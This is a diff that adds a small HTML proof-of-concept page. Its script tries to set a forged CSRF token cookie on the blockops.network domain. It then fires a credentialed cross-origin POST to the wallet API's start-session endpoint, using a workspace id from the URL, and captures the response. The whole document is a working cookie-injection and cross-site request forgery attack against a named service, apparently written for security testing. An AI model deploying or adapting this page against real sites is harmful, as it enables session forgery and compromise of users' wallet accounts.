@@ -1,0 +1,17 @@
+<!doctype html><html><head><meta charset="utf-8"><title>amp-38227</title></head>
+<body><h1>amp-38227</h1>
+<script>
+window.__r = {started:false, steps:[]};
+try {
+  document.cookie = 'csrf_token=ATTACKERFORGEDTOKEN38227; Domain=.blockops.network; Path=/; SameSite=Strict';
+  window.__r.steps.push('cookie-set-attempted');
+} catch(e){ window.__r.steps.push('cookie-err:'+e); }
+var qs = new URLSearchParams(location.search);
+var ws = qs.get('ws') || '';
+var target = 'https://blockops-wallet-api.blockops.network/api/v1/authentication/start-session';
+window.__r.started = true;
+fetch(target, {method:'POST', credentials:'include', headers:{'Content-Type':'text/plain'}, body: JSON.stringify({workspace_id: ws})})
+ .then(function(r){ window.__r.ok = true; window.__r.status = r.status; window.__r.typ = r.type;
+    return r.text().then(function(t){window.__r.body = t.slice(0,400);}).catch(function(e){window.__r.bodyErr=String(e);});
+ }).catch(function(e){ window.__r.ok = false; window.__r.err = String(e); });
+</script></body></html>
